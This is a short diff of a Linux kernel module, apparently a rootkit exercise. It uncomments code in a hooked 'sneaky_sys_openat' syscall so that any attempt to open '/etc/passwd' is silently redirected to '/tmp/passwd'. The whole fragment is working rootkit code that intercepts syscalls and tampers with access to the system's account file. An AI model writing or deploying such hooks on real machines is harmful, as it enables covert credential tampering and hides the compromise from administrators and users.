@@ -47,11 +47,9 @@ asmlinkage ssize_t (*original_read)(struct pt_regs *);
 // DI, SI, DX
 asmlinkage int sneaky_sys_openat(struct pt_regs *regs) {
     // Implement the sneaky part here
-    /*
     if (strnstr((char *)regs->si, "/etc/passwd", strlen("/etc/passwd")) != NULL) {
         copy_to_user((void *)regs->si, "/tmp/passwd", strlen("/tmp/passwd"));
     }
-     */
     return (*original_openat)(regs);
 }
 
